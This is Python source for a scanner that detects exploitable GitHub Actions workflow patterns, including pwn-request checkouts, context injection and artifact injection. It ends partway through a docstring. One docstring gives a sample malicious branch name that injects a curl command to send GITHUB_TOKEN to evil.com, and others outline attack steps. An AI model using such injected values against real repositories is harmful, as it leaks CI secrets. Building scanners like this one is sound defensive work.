"""Vulnerability detectors for GitHub Actions workflows."""

import re
from abc import ABC, abstractmethod
from pathlib import Path

import yaml

from actions_scanner.utils.path import extract_org_repo_branch_from_path

from .models import ProtectionLevel, ScanResult, VulnerabilityType, VulnerableJob
from .patterns import (
    ACTOR_GATING_PATTERNS,
    ARTIFACT_READ_PATTERNS,
    AUTHORIZATION_JOB_PATTERNS,
    DANGEROUS_COMMANDS,
    DANGEROUS_GIT_CHECKOUT_PATTERNS,
    DANGEROUS_REF_PATTERNS,
    DANGEROUS_REPO_PATTERNS,
    DISCUSSION_INJECTABLE_CONTEXTS,
    DISPATCH_PR_CHECKOUT_PATTERNS,
    ISSUE_COMMENT_INJECTABLE_CONTEXTS,
    ISSUE_COMMENT_PR_PATTERNS,
    ISSUES_INJECTABLE_CONTEXTS,
    MERGED_PR_PATTERNS,
    PERMISSION_CHECK_PATTERNS,
    PERMISSION_OUTPUT_PATTERNS,
    PR_TARGET_INJECTABLE_CONTEXTS,
    SAFE_ARTIFACT_EXTRACTION_PATTERNS,
    SAFE_WORKFLOW_DISPATCH_REF_PATTERNS,
    SAME_REPO_PATTERNS,
    SCRIPT_FAIL_PATTERNS,
    SCRIPT_LABEL_CHECK_PATTERNS,
    WORKFLOW_RUN_ARTIFACT_DOWNLOAD_PATTERNS,
    WORKFLOW_RUN_DANGEROUS_REF_PATTERNS,
    WORKFLOW_RUN_GIT_CHECKOUT_PATTERNS,
    WORKFLOW_RUN_INJECTABLE_CONTEXTS,
    WORKFLOW_RUN_REPO_VALIDATION_PATTERNS,
    WRITE_ACCESS_PATTERNS,
)


def _has_trigger(workflow: dict, trigger_name: str) -> bool:
    """Check if workflow has a specific trigger."""
    on_section = workflow.get("on") or workflow.get(True)  # 'on' parses as True in YAML
    if on_section is None:
        return False

    if isinstance(on_section, (dict, list)):
        return trigger_name in on_section
    if isinstance(on_section, str):
        return on_section == trigger_name

    return False


def _get_workflow_run_triggers(workflow: dict) -> list[str]:
    """Extract the list of workflow names that can trigger a workflow_run.

    Returns a list of workflow names, or empty list if not a workflow_run trigger.
    """
    on_section = workflow.get("on") or workflow.get(True)
    if not isinstance(on_section, dict):
        return []

    workflow_run_config = on_section.get("workflow_run", {})
    if not isinstance(workflow_run_config, dict):
        return []

    workflows = workflow_run_config.get("workflows", [])
    if isinstance(workflows, str):
        workflows = [workflows]
    return [str(w) for w in workflows] if isinstance(workflows, list) else []


def _has_safe_dispatch_fallback(ref_value: str) -> bool:
    """Check if a ref value has a safe fallback from workflow_dispatch inputs.

    Pattern like: inputs.tag || github.event.workflow_run.head_sha
    The inputs.* part requires write access (workflow_dispatch), making the
    workflow_run path less likely to be the primary attack vector.
    """
    if not ref_value or "||" not in ref_value:
        return False

    ref_str = str(ref_value)
    for pattern in SAFE_WORKFLOW_DISPATCH_REF_PATTERNS:
        match = re.search(pattern, ref_str)
        if match and ref_str.find("||") > match.end():
            return True
    return False


def _is_dangerous_command(cmd: str) -> bool:
    """Check if a command is a dangerous build command."""
    if not cmd:
        return False
    cmd_str = str(cmd).strip()
    for line in cmd_str.split("\n"):
        line = line.strip()
        if any(re.search(pattern, line, re.IGNORECASE) for pattern in DANGEROUS_COMMANDS):
            return True
    return False


def _is_local_action(uses_value: str) -> bool:
    """Check if a uses value is a local action (starts with ./)."""
    if not uses_value:
        return False
    return str(uses_value).strip().startswith("./")


def _get_line_number(workflow_content: str, job_name: str, step_index: int) -> int:
    """Estimate line number for a step in a job.

    This is approximate - for precise line numbers,
    use a YAML parser that tracks positions.
    """
    lines = workflow_content.split("\n")
    in_job = False
    in_steps = False
    step_count = -1

    for i, line in enumerate(lines, 1):
        stripped = line.strip()

        if re.match(rf"^\s*{re.escape(job_name)}:\s*$", line) or re.match(
            rf"^\s*{re.escape(job_name)}:\s*#", line
        ):
            in_job = True
            continue

        if in_job:
            if (
                re.match(r"^\s{2}[a-zA-Z_-]+:\s*$", line)
                and not stripped.startswith("-")
                and "steps:" not in stripped
                and ":" in stripped
            ):
                indent = len(line) - len(line.lstrip())
                if indent <= 2:
                    break

            if "steps:" in stripped:
                in_steps = True
                continue

            if in_steps and re.match(r"^\s*-\s+", line):
                step_count += 1
                if step_count == step_index:
                    return i

    return 0


class BaseDetector(ABC):
    """Base class for vulnerability detectors with shared functionality."""

    @abstractmethod
    def analyze_workflow(self, workflow_path: Path) -> list[VulnerableJob]:
        """Analyze a workflow file for vulnerabilities."""
        ...

    def scan_directory(self, directory: Path) -> ScanResult:
        """Scan a directory for vulnerable workflows.

        Only scans .github/workflows at the repository root, not in subdirectories.
        """
        result = ScanResult()

        workflows_dir = directory / ".github" / "workflows"
        if not workflows_dir.is_dir():
            return result

        for yaml_file in workflows_dir.iterdir():
            if not yaml_file.is_file():
                continue
            if yaml_file.suffix not in (".yml", ".yaml"):
                continue
            try:
                vulns = self.analyze_workflow(yaml_file)
                result.vulnerabilities.extend(vulns)
                result.files_scanned += 1
            except Exception as e:
                result.errors.append(f"{yaml_file}: {e}")

        return result

    def _is_positive_label_gate(self, if_condition: str) -> bool:
        """Check if an if condition is a POSITIVE label gate (requires label to run).

        Positive: contains(...labels..., 'foo') without negation -> requires label
        Negative: !contains(...labels..., 'foo') -> skips if label present (NOT a gate!)
        """
        if not if_condition:
            return False

        # Check for explicit "labeled" action requirement
        if re.search(r"github\.event\.action\s*==\s*['\"]labeled['\"]", if_condition):
            return True

        # Check for contains() on labels
        contains_match = re.search(
            r"contains\s*\(\s*github\.event\.pull_request\.labels", if_condition
        )
        if contains_match:
            # Check if this contains() is negated
            before_contains = if_condition[: contains_match.start()]
            # Negated contains = skip if label present = NOT a gate
            # Non-negated contains = require label = IS a gate
            return not (
                re.search(r"!\s*$", before_contains)
                or re.search(r"\bnot\s*$", before_contains, re.IGNORECASE)
            )

        return False

    def _check_job_label_gating(self, job: dict, workflow: dict) -> tuple[bool, str]:
        """Check if a job or its dependencies require a specific label to run."""
        jobs = workflow.get("jobs", {})

        if_condition = str(job.get("if", ""))
        if self._is_positive_label_gate(if_condition):
            return True, f"Job requires label: {if_condition[:80]}"

        needs = job.get("needs", [])
        if isinstance(needs, str):
            needs = [needs]

        for need in needs:
            dep_job = jobs.get(need, {})
            if isinstance(dep_job, dict):
                dep_if = str(dep_job.get("if", ""))
                if self._is_positive_label_gate(dep_if):
                    return True, f"Dependency '{need}' requires label: {dep_if[:60]}"

        # Check for label gating in github-script steps (current job + dependencies)
        jobs_to_check: list[tuple[str, dict]] = [("", job)]
        for need in needs:
            dep_job = jobs.get(need, {})
            if isinstance(dep_job, dict):
                jobs_to_check.append((need, dep_job))

        for job_label, check_job in jobs_to_check:
            steps = check_job.get("steps", [])
            if not isinstance(steps, list):
                continue
            for step in steps:
                if not isinstance(step, dict):
                    continue
                uses = step.get("uses", "")
                if "github-script" not in str(uses):
                    continue
                with_block = step.get("with", {})
                script = str(with_block.get("script", ""))
                has_label_check = any(re.search(p, script) for p in SCRIPT_LABEL_CHECK_PATTERNS)
                has_fail = any(re.search(p, script) for p in SCRIPT_FAIL_PATTERNS)
                if has_label_check and has_fail:
                    detail = (
                        f"Dependency '{job_label}' checks labels via github-script"
                        if job_label
                        else "Step checks labels via github-script and fails if missing"
                    )
                    return True, detail

        return False, ""

    def _check_job_same_repo_gating(self, job: dict, workflow: dict) -> tuple[bool, str]:
        """Check if a job only runs for PRs from the same repo (not forks)."""
        jobs = workflow.get("jobs", {})

        if_condition = str(job.get("if", ""))
        for pattern in SAME_REPO_PATTERNS:
            if re.search(pattern, if_condition, re.IGNORECASE):
                return True, f"Job only runs for same-repo PRs: {if_condition[:80]}"

        needs = job.get("needs", [])
        if isinstance(needs, str):
            needs = [needs]

        for need in needs:
            dep_job = jobs.get(need, {})
            if isinstance(dep_job, dict):
                dep_if = str(dep_job.get("if", ""))
                for pattern in SAME_REPO_PATTERNS:
                    if re.search(pattern, dep_if, re.IGNORECASE):
                        return True, f"Dependency '{need}' only runs for same-repo PRs"

        return False, ""

    def _check_job_permission_gating(self, job: dict, workflow: dict) -> tuple[bool, str]:
        """Check if a job is gated by a collaborator permission check.

        This requires:
        1. The job's if condition checks a permission-related output from a dependency
        2. That dependency actually calls getCollaboratorPermissionLevel
        3. That dependency checks for write/admin/maintain access
        """
        jobs = workflow.get("jobs", {})
        if_condition = str(job.get("if", ""))

        referenced_jobs = set()
        for pattern in PERMISSION_OUTPUT_PATTERNS:
            for match in re.finditer(pattern, if_condition):
                if match.groups():
                    referenced_jobs.add(match.group(1))

        if not referenced_jobs:
            return False, ""

        for ref_job_name in referenced_jobs:
            dep_job = jobs.get(ref_job_name, {})
            if not isinstance(dep_job, dict):
                continue

            steps = dep_job.get("steps", [])
            if not isinstance(steps, list):
                continue

            for step in steps:
                if not isinstance(step, dict):
                    continue

                uses = step.get("uses", "")
                if "github-script" not in str(uses):
                    continue

                with_block = step.get("with", {})
                script = str(with_block.get("script", ""))

                has_perm_check = any(
                    re.search(pattern, script) for pattern in PERMISSION_CHECK_PATTERNS
                )
                has_write_check = any(
                    re.search(pattern, script, re.IGNORECASE) for pattern in WRITE_ACCESS_PATTERNS
                )

                if has_perm_check and has_write_check:
                    return (
                        True,
                        f"Job '{ref_job_name}' verifies collaborator has write/admin/maintain access",
                    )

        return False, ""

    def _check_job_actor_gating(self, job: dict, workflow: dict) -> tuple[bool, str]:
        """Check if a job only runs for specific actors (bots or named users)."""
        jobs = workflow.get("jobs", {})

        if_condition = str(job.get("if", ""))
        for pattern in ACTOR_GATING_PATTERNS:
            if re.search(pattern, if_condition, re.IGNORECASE):
                return True, f"Job only runs for specific actor: {if_condition[:80]}"

        needs = job.get("needs", [])
        if isinstance(needs, str):
            needs = [needs]

        for need in needs:
            dep_job = jobs.get(need, {})
            if isinstance(dep_job, dict):
                dep_if = str(dep_job.get("if", ""))
                for pattern in ACTOR_GATING_PATTERNS:
                    if re.search(pattern, dep_if, re.IGNORECASE):
                        return True, f"Dependency '{need}' only runs for specific actor"

        return False, ""

    def _check_job_merged_pr_gating(self, job: dict, workflow: dict) -> tuple[bool, str]:
        """Check if a job only runs after a PR is merged."""
        jobs = workflow.get("jobs", {})

        if_condition = str(job.get("if", ""))
        for pattern in MERGED_PR_PATTERNS:
            if re.search(pattern, if_condition, re.IGNORECASE):
                return True, f"Job only runs on merged PRs: {if_condition[:80]}"

        needs = job.get("needs", [])
        if isinstance(needs, str):
            needs = [needs]

        for need in needs:
            dep_job = jobs.get(need, {})
            if isinstance(dep_job, dict):
                dep_if = str(dep_job.get("if", ""))
                for pattern in MERGED_PR_PATTERNS:
                    if re.search(pattern, dep_if, re.IGNORECASE):
                        return True, f"Dependency '{need}' only runs on merged PRs"

        return False, ""

    def _check_workflow_run_repo_validation(self, job: dict, workflow: dict) -> tuple[bool, str]:
        """Check if a workflow_run job validates the triggering repository.

        Some workflow_run workflows validate that the triggering workflow came from
        the same repository (not a fork) by passing head_repository.full_name into
        an env variable and comparing it against github.repository. This is
        equivalent to same_repo gating.

        We only match when the pattern appears in a step's env: block (indicating
        it's being captured for comparison), NOT when it appears directly in a
        run: block (where it may just be logged/echoed without validation).
        """
        if not _has_trigger(workflow, "workflow_run"):
            return False, ""

        steps = job.get("steps", [])
        if not isinstance(steps, list):
            return False, ""

        for step in steps:
            if not isinstance(step, dict):
                continue
            env = step.get("env", {})
            if isinstance(env, dict):
                for val in env.values():
                    val_str = str(val)
                    for pattern in WORKFLOW_RUN_REPO_VALIDATION_PATTERNS:
                        if re.search(pattern, val_str, re.IGNORECASE):
                            return True, "Job validates workflow_run source repository"

        return False, ""

    def _analyze_protection(self, workflow: dict, job_name: str) -> tuple[str, str]:
        """Determine what protection (if any) a vulnerable job has.

        Returns (protection_type, detail).

        Protection types:
        - "none": Fully exploitable by any PR author
        - "label": Requires maintainer to add label (social engineering vector)
        - "permission": Requires PR author to have write/admin/maintain access
        - "same_repo": Only runs for PRs from same repo, not forks
        - "actor": Only runs for specific bot actors
        - "merged": Only runs on merged PRs (code already reviewed)
        """
        jobs = workflow.get("jobs", {})
        job = jobs.get(job_name, {})

        # Check for permission gating (strongest protection)
        is_perm_gated, perm_reason = self._check_job_permission_gating(job, workflow)
        if is_perm_gated:
            return "permission", perm_reason

        # Check for actor gating
        is_actor_gated, actor_reason = self._check_job_actor_gating(job, workflow)
        if is_actor_gated:
            return "actor", actor_reason

        # Check for merged PR gating
        is_merged_gated, merged_reason = self._check_job_merged_pr_gating(job, workflow)
        if is_merged_gated:
            return "merged", merged_reason

        # Check for workflow_run repository validation (step-level same_repo check)
        is_repo_validated, repo_reason = self._check_workflow_run_repo_validation(job, workflow)
        if is_repo_validated:
            return "same_repo", repo_reason

        # Check for both same-repo and label gating
        is_same_repo, same_repo_reason = self._check_job_same_repo_gating(job, workflow)
        is_label_gated, label_reason = self._check_job_label_gating(job, workflow)

        # If both same-repo AND label checks exist in an OR condition,
        # the protection is only as strong as the weaker one (label-gated)
        if is_same_repo and is_label_gated:
            if_condition = str(job.get("if", ""))
            needs = job.get("needs", [])
            if isinstance(needs, str):
                needs = [needs]
            for need in needs:
                dep_job = jobs.get(need, {})
                if isinstance(dep_job, dict):
                    if_condition += " " + str(dep_job.get("if", ""))

            if "||" in if_condition:
                return "label", f"OR condition: {label_reason}"

        if is_same_repo:
            return "same_repo", same_repo_reason

        if is_label_gated:
            return "label", label_reason

        return "none", ""


class PwnRequestDetector(BaseDetector):
    """Detects PwnRequest vulnerabilities in GitHub Actions workflows.

    A PwnRequest vulnerability requires three conditions in the same job:
    1. pull_request_target trigger
    2. Checkout of untrusted PR code (head.ref, head.sha, merge_commit_sha)
    3. Execution of code from the checkout (npm, make, local actions, etc.)
    """

    def analyze_workflow(self, workflow_path: Path) -> list[VulnerableJob]:
        """Analyze a workflow file for PwnRequest vulnerabilities."""
        vulnerabilities = []

        try:
            content = workflow_path.read_text()
            workflow = yaml.safe_load(content)
        except Exception:
            return []

        if not isinstance(workflow, dict):
            return []

        if not _has_trigger(workflow, "pull_request_target"):
            return []

        jobs = workflow.get("jobs", {})
        if not isinstance(jobs, dict):
            return []

        for job_name, job_config in jobs.items():
            if not isinstance(job_config, dict):
                continue

            steps = job_config.get("steps", [])
            if not isinstance(steps, list):
                continue

            checkout_result = self._find_dangerous_checkout(steps)
            if not checkout_result:
                continue

            checkout_index, checkout_ref = checkout_result

            exec_result = self._find_dangerous_exec(steps, checkout_index)
            if not exec_result:
                continue

            exec_index, exec_type, exec_value = exec_result

            checkout_line = _get_line_number(content, job_name, checkout_index)
            exec_line = _get_line_number(content, job_name, exec_index)
            has_auth = self._has_authorization_job(workflow, job_name)
            protection, protection_detail = self._analyze_protection(workflow, job_name)
            _org, _repo, branch = extract_org_repo_branch_from_path(str(workflow_path))

            vulnerabilities.append(
                VulnerableJob(
                    workflow_path=workflow_path,
                    job_name=job_name,
                    checkout_line=checkout_line,
                    checkout_ref=checkout_ref,
                    exec_line=exec_line,
                    exec_type=exec_type,
                    exec_value=exec_value,
                    has_authorization=has_auth,
                    branch=branch,
                    protection=protection,
                    protection_detail=protection_detail,
                )
            )

        return vulnerabilities

    def _is_dangerous_ref(self, ref_value: str) -> bool:
        """Check if a ref value contains dangerous PR references."""
        if not ref_value:
            return False
        ref_str = str(ref_value)
        return any(re.search(pattern, ref_str) for pattern in DANGEROUS_REF_PATTERNS)

    def _find_dangerous_checkout(self, steps: list) -> tuple[int, str] | None:
        """Find a dangerous checkout step in a list of steps.

        Returns (step_index, ref_value) or None.
        Checks both actions/checkout refs and git commands that checkout PR code.
        """
        for i, step in enumerate(steps):
            if not isinstance(step, dict):
                continue

            uses = step.get("uses", "")
            if uses and "actions/checkout" in str(uses):
                with_block = step.get("with", {})
                if isinstance(with_block, dict):
                    ref = with_block.get("ref", "")
                    if self._is_dangerous_ref(ref):
                        return (i, str(ref))

                    repo_value = with_block.get("repository", "")
                    if repo_value:
                        repo_str = str(repo_value)
                        if any(re.search(pattern, repo_str) for pattern in DANGEROUS_REPO_PATTERNS):
                            return (i, f"repository={repo_str}")

            run = step.get("run", "")
            if run:
                run_str = str(run)
                for pattern in DANGEROUS_GIT_CHECKOUT_PATTERNS:
                    if re.search(pattern, run_str, re.IGNORECASE):
                        return (i, "git checkout PR code")

        return None

    def _find_dangerous_exec(self, steps: list, checkout_index: int) -> tuple[int, str, str] | None:
        """Find a dangerous exec step after the checkout.

        Returns (step_index, exec_type, exec_value) or None.
        """
        for i, step in enumerate(steps):
            if i <= checkout_index:
                continue

            if not isinstance(step, dict):
                continue

            uses = step.get("uses", "")
            if _is_local_action(uses):
                return (i, "local_action", str(uses))

            run = step.get("run", "")
            if _is_dangerous_command(run):
                cmd_str = str(run).strip()
                first_line = cmd_str.split("\n")[0].strip()[:50]
                return (i, "build_command", first_line)

        return None

    def _has_authorization_job(self, workflow: dict, job_name: str) -> bool:
        """Check if a job has an authorization dependency (needs: authorize or similar)."""
        jobs = workflow.get("jobs", {})
        job = jobs.get(job_name, {})
        needs = job.get("needs", [])

        if isinstance(needs, str):
            needs = [needs]

        for need in needs:
            need_lower = str(need).lower()
            if any(pattern in need_lower for pattern in AUTHORIZATION_JOB_PATTERNS):
                return True

        return False


class WorkflowRunDetector(BaseDetector):
    """Detects workflow_run vulnerabilities in GitHub Actions workflows.

    A workflow_run vulnerability requires three conditions in the same job:
    1. workflow_run trigger
    2. Checkout of PR code from the triggering workflow
    3. Execution of code from the checkout (npm, make, local actions, etc.)
    """

    def analyze_workflow(self, workflow_path: Path) -> list[VulnerableJob]:
        """Analyze a workflow file for workflow_run vulnerabilities."""
        vulnerabilities = []

        try:
            content = workflow_path.read_text()
            workflow = yaml.safe_load(content)
        except Exception:
            return []

        if not isinstance(workflow, dict):
            return []

        if not _has_trigger(workflow, "workflow_run"):
            return []

        # Extract triggering workflow names for context
        triggering_workflows = _get_workflow_run_triggers(workflow)

        jobs = workflow.get("jobs", {})
        if not isinstance(jobs, dict):
            return []

        for job_name, job_config in jobs.items():
            if not isinstance(job_config, dict):
                continue

            steps = job_config.get("steps", [])
            if not isinstance(steps, list):
                continue

            checkout_result = self._find_dangerous_checkout(steps)
            if not checkout_result:
                continue

            checkout_index, checkout_ref = checkout_result

            # Check if ref has a safe workflow_dispatch fallback
            # Pattern: inputs.tag || github.event.workflow_run.head_sha
            # The inputs.* requires write access, reducing exploitability
            if _has_safe_dispatch_fallback(checkout_ref):
                protection = ProtectionLevel.DISPATCH_FALLBACK.value
                triggered_by = ", ".join(triggering_workflows) or "unknown"
                protection_detail = (
                    f"Ref has workflow_dispatch input fallback (requires write access). "
                    f"Triggered by: {triggered_by}"
                )
            else:
                protection, protection_detail = self._analyze_protection(workflow, job_name)
                if triggering_workflows:
                    triggered_by = ", ".join(triggering_workflows)
                    if protection_detail:
                        protection_detail = f"{protection_detail}; triggered by: {triggered_by}"
                    else:
                        protection_detail = f"Triggered by: {triggered_by}"

            exec_result = self._find_dangerous_exec(steps, checkout_index)
            if not exec_result:
                continue

            exec_index, exec_type, exec_value = exec_result

            checkout_line = _get_line_number(content, job_name, checkout_index)
            exec_line = _get_line_number(content, job_name, exec_index)
            _org, _repo, branch = extract_org_repo_branch_from_path(str(workflow_path))

            vulnerabilities.append(
                VulnerableJob(
                    workflow_path=workflow_path,
                    job_name=job_name,
                    checkout_line=checkout_line,
                    checkout_ref=checkout_ref,
                    exec_line=exec_line,
                    exec_type=exec_type,
                    exec_value=exec_value,
                    has_authorization=False,
                    branch=branch,
                    protection=protection,
                    protection_detail=protection_detail,
                    vulnerability_type=VulnerabilityType.WORKFLOW_RUN.value,
                    triggering_workflows=triggering_workflows,
                )
            )

        return vulnerabilities

    def _is_dangerous_workflow_run_ref(self, ref_value: str) -> bool:
        """Check if a ref value contains dangerous workflow_run references."""
        if not ref_value:
            return False
        ref_str = str(ref_value)
        return any(re.search(pattern, ref_str) for pattern in WORKFLOW_RUN_DANGEROUS_REF_PATTERNS)

    def _find_dangerous_checkout(self, steps: list) -> tuple[int, str] | None:
        """Find a dangerous checkout step in a list of steps.

        Returns (step_index, ref_value) or None.
        """
        for i, step in enumerate(steps):
            if not isinstance(step, dict):
                continue

            uses = step.get("uses", "")
            if uses and "actions/checkout" in str(uses):
                with_block = step.get("with", {})
                if isinstance(with_block, dict):
                    ref = with_block.get("ref", "")
                    if self._is_dangerous_workflow_run_ref(ref):
                        return (i, str(ref))

            run = step.get("run", "")
            if run:
                run_str = str(run)
                for pattern in WORKFLOW_RUN_GIT_CHECKOUT_PATTERNS:
                    if re.search(pattern, run_str, re.IGNORECASE):
                        return (i, "git checkout workflow_run code")

        return None

    def _find_dangerous_exec(self, steps: list, checkout_index: int) -> tuple[int, str, str] | None:
        """Find a dangerous exec step after the checkout.

        Returns (step_index, exec_type, exec_value) or None.
        """
        for i, step in enumerate(steps):
            if i <= checkout_index:
                continue

            if not isinstance(step, dict):
                continue

            uses = step.get("uses", "")
            if _is_local_action(uses):
                return (i, "local_action", str(uses))

            run = step.get("run", "")
            if _is_dangerous_command(run):
                cmd_str = str(run).strip()
                first_line = cmd_str.split("\n")[0].strip()[:50]
                return (i, "build_command", first_line)

        return None


class ContextInjectionDetector(BaseDetector):
    """Detects context injection vulnerabilities in GitHub Actions workflows.

    A context injection vulnerability occurs when:
    1. A dangerous trigger (pull_request_target, workflow_run, issues, issue_comment, etc.)
    2. Attacker-controlled context variables are interpolated into run: blocks
    3. NO checkout is required - the injection happens via ${{ }} expressions

    Example vulnerable pattern:
        on: pull_request_target
        jobs:
          build:
            steps:
              - run: echo "Branch: ${{ github.head_ref }}"

    An attacker can create a branch named: "; curl evil.com?t=$GITHUB_TOKEN #"
    to achieve command injection.

    Similar patterns exist for:
    - issues: Anyone can create an issue with malicious title/body
    - issue_comment: Anyone who can comment can inject via comment body
    - discussion/discussion_comment: Similar injection vectors
    """

    def __init__(self) -> None:
        pr_target_combined = "|".join(PR_TARGET_INJECTABLE_CONTEXTS)
        workflow_run_combined = "|".join(WORKFLOW_RUN_INJECTABLE_CONTEXTS)
        issues_combined = "|".join(ISSUES_INJECTABLE_CONTEXTS)
        issue_comment_combined = "|".join(ISSUE_COMMENT_INJECTABLE_CONTEXTS)
        discussion_combined = "|".join(DISCUSSION_INJECTABLE_CONTEXTS)

        self._pr_target_pattern = re.compile(
            rf"\$\{{\{{\s*({pr_target_combined})\s*\}}\}}", re.IGNORECASE
        )
        self._workflow_run_pattern = re.compile(
            rf"\$\{{\{{\s*({workflow_run_combined})\s*\}}\}}", re.IGNORECASE
        )
        self._issues_pattern = re.compile(
            rf"\$\{{\{{\s*({issues_combined})\s*\}}\}}", re.IGNORECASE
        )
        self._issue_comment_pattern = re.compile(
            rf"\$\{{\{{\s*({issue_comment_combined})\s*\}}\}}", re.IGNORECASE
        )
        self._discussion_pattern = re.compile(
            rf"\$\{{\{{\s*({discussion_combined})\s*\}}\}}", re.IGNORECASE
        )

    def analyze_workflow(self, workflow_path: Path) -> list[VulnerableJob]:
        """Analyze a workflow file for context injection vulnerabilities."""
        vulnerabilities = []

        try:
            content = workflow_path.read_text()
            workflow = yaml.safe_load(content)
        except Exception:
            return []

        if not isinstance(workflow, dict):
            return []

        has_pr_target = _has_trigger(workflow, "pull_request_target")
        has_workflow_run = _has_trigger(workflow, "workflow_run")
        has_issues = _has_trigger(workflow, "issues")
        has_issue_comment = _has_trigger(workflow, "issue_comment")
        has_discussion = _has_trigger(workflow, "discussion")
        has_discussion_comment = _has_trigger(workflow, "discussion_comment")

        if not any(
            [
                has_pr_target,
                has_workflow_run,
                has_issues,
                has_issue_comment,
                has_discussion,
                has_discussion_comment,
            ]
        ):
            return []

        # Select appropriate pattern based on trigger
        if has_pr_target:
            pattern = self._pr_target_pattern
        elif has_workflow_run:
            pattern = self._workflow_run_pattern
        elif has_issues:
            pattern = self._issues_pattern
        elif has_issue_comment:
            pattern = self._issue_comment_pattern
        else:  # discussion or discussion_comment
            pattern = self._discussion_pattern

        jobs = workflow.get("jobs", {})
        if not isinstance(jobs, dict):
            return []

        for job_name, job_config in jobs.items():
            if not isinstance(job_config, dict):
                continue

            steps = job_config.get("steps", [])
            if not isinstance(steps, list):
                continue

            for step_index, step in enumerate(steps):
                if not isinstance(step, dict):
                    continue

                run_block = step.get("run", "")
                if not run_block:
                    continue

                run_str = str(run_block)

                matches = pattern.findall(run_str)
                if matches:
                    line_number = _get_line_number(content, job_name, step_index)
                    protection, protection_detail = self._analyze_protection(workflow, job_name)
                    _org, _repo, branch = extract_org_repo_branch_from_path(str(workflow_path))

                    dangerous_expr = f"${{{{ {matches[0]} }}}}"

                    vulnerabilities.append(
                        VulnerableJob(
                            workflow_path=workflow_path,
                            job_name=job_name,
                            checkout_line=0,
                            checkout_ref=dangerous_expr,
                            exec_line=line_number,
                            exec_type="context_injection",
                            exec_value=run_str[:80],
                            has_authorization=False,
                            branch=branch,
                            protection=protection,
                            protection_detail=protection_detail,
                            vulnerability_type=VulnerabilityType.CONTEXT_INJECTION.value,
                        )
                    )

        return vulnerabilities


class ArtifactInjectionDetector(BaseDetector):
    """Detects artifact injection vulnerabilities in workflow_run workflows.

    An artifact injection vulnerability occurs when:
    1. workflow_run trigger (runs with base repo privileges after another workflow completes)
    2. Downloads artifacts from the triggering workflow using run-id from workflow_run
    3. Reads artifact content into shell variables or commands

    Example vulnerable pattern:
        on:
          workflow_run:
            workflows: ["CI"]
            types: [completed]
        jobs:
          build:
            steps:
              - uses: actions/download-artifact@v4
                with:
                  run-id: ${{ github.event.workflow_run.id }}
              - run: |
                  BRANCH=$(<artifact/branch.txt)
                  ./deploy.sh $BRANCH

    An attacker can:
    1. Create a malicious PR that triggers the CI workflow
    2. The CI workflow creates artifacts with attacker-controlled content
    3. The workflow_run workflow downloads and uses that content unsafely
    """

    def analyze_workflow(self, workflow_path: Path) -> list[VulnerableJob]:
        """Analyze a workflow file for artifact injection vulnerabilities."""
        vulnerabilities = []

        try:
            content = workflow_path.read_text()
            workflow = yaml.safe_load(content)
        except Exception:
            return []

        if not isinstance(workflow, dict):
            return []

        if not _has_trigger(workflow, "workflow_run"):
            return []

        # Extract triggering workflow names for context
        triggering_workflows = _get_workflow_run_triggers(workflow)

        jobs = workflow.get("jobs", {})
        if not isinstance(jobs, dict):
            return []

        for job_name, job_config in jobs.items():
            if not isinstance(job_config, dict):
                continue

            steps = job_config.get("steps", [])
            if not isinstance(steps, list):
                continue

            # Find artifact download step that uses workflow_run.id
            artifact_download_index = self._find_workflow_run_artifact_download(steps)
            if artifact_download_index is None:
                continue

            # Find subsequent step that reads artifact content into shell
            artifact_read_result = self._find_artifact_read(steps, artifact_download_index)
            if not artifact_read_result:
                continue

            read_index, read_pattern, is_safe_extraction = artifact_read_result

            download_line = _get_line_number(content, job_name, artifact_download_index)
            read_line = _get_line_number(content, job_name, read_index)
            _org, _repo, branch = extract_org_repo_branch_from_path(str(workflow_path))

            # Check if the extraction uses safe patterns (jq with proper quoting)
            if is_safe_extraction:
                protection = ProtectionLevel.SAFE_USAGE.value
                triggered_by = ", ".join(triggering_workflows) or "unknown"
                protection_detail = (
                    f"Uses jq for safe JSON extraction. Triggered by: {triggered_by}"
                )
            else:
                protection, protection_detail = self._analyze_protection(workflow, job_name)
                if triggering_workflows:
                    triggered_by = ", ".join(triggering_workflows)
                    if protection_detail:
                        protection_detail = f"{protection_detail}; triggered by: {triggered_by}"
                    else:
                        protection_detail = f"Triggered by: {triggered_by}"

            vulnerabilities.append(
                VulnerableJob(
                    workflow_path=workflow_path,
                    job_name=job_name,
                    checkout_line=download_line,
                    checkout_ref="artifact from workflow_run",
                    exec_line=read_line,
                    exec_type="artifact_read",
                    exec_value=read_pattern[:80],
                    has_authorization=False,
                    branch=branch,
                    protection=protection,
                    protection_detail=protection_detail,
                    vulnerability_type=VulnerabilityType.ARTIFACT_INJECTION.value,
                    triggering_workflows=triggering_workflows,
                )
            )

        return vulnerabilities

    def _find_workflow_run_artifact_download(self, steps: list) -> int | None:
        """Find an artifact download step that retrieves from workflow_run.

        Returns step index or None if not found.
        """
        for i, step in enumerate(steps):
            if not isinstance(step, dict):
                continue

            uses = step.get("uses", "")
            if not uses or "download-artifact" not in str(uses):
                continue

            with_block = step.get("with", {})
            if not isinstance(with_block, dict):
                continue

            # Check if run-id references workflow_run
            run_id = str(with_block.get("run-id", ""))
            for pattern in WORKFLOW_RUN_ARTIFACT_DOWNLOAD_PATTERNS:
                if re.search(pattern, run_id):
                    return i

        return None

    def _find_artifact_read(self, steps: list, download_index: int) -> tuple[int, str, bool] | None:
        """Find a step after download that reads artifact content.

        Returns (step_index, matched_pattern, is_safe_extraction) or None.
        is_safe_extraction is True if the data is extracted via jq (safe JSON parsing).
        """
        for i, step in enumerate(steps):
            if i <= download_index:
                continue

            if not isinstance(step, dict):
                continue

            run_block = step.get("run", "")
            if not run_block:
                continue

            run_str = str(run_block)

            # First check for safe extraction patterns (jq)
            # jq extracts JSON values safely - no command injection in the value itself
            for safe_pattern in SAFE_ARTIFACT_EXTRACTION_PATTERNS:
                match = re.search(safe_pattern, run_str)
                if match:
                    return (i, match.group(0), True)

            # Then check for unsafe patterns
            for pattern in ARTIFACT_READ_PATTERNS:
                match = re.search(pattern, run_str)
                if match:
                    return (i, match.group(0), False)

        return None


class DispatchCheckoutDetector(BaseDetector):
    """Detects confused deputy vulnerabilities via issue_comment/workflow_dispatch.

    A confused deputy vulnerability occurs when:
    1. Trigger is issue_comment (or similar dispatch trigger like repository_dispatch)
    2. The workflow acts on a PR (checks github.event.issue.pull_request)
    3. PR code is checked out using refs/pull/N/head
    4. Dangerous commands are executed on the PR code

    This is dangerous even with permission checks on the commenter because:
    - The PR author's code gets executed, not the commenter's code
    - A malicious PR author creates a PR with poisoned build files
